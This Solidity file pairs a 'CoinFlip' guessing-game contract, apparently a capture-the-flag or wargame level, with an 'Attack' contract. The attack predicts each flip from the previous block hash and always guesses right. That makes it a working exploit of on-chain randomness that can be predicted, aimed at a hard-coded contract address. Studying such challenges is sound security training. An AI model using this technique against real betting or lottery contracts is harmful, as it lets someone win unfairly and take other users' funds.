// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../SafeMath.sol";

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}


contract Attack {
    using SafeMath for uint256;

    CoinFlip public coinFlip;

    constructor() public {
        coinFlip = CoinFlip(0x84e03ba26916cd4E22e34898C21ACA58da37E509);
    }

    function attack() public {
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        if (blockValue.div(FACTOR) == 1) {
            coinFlip.flip(true);
        } else {
            coinFlip.flip(false);
        }
    }
}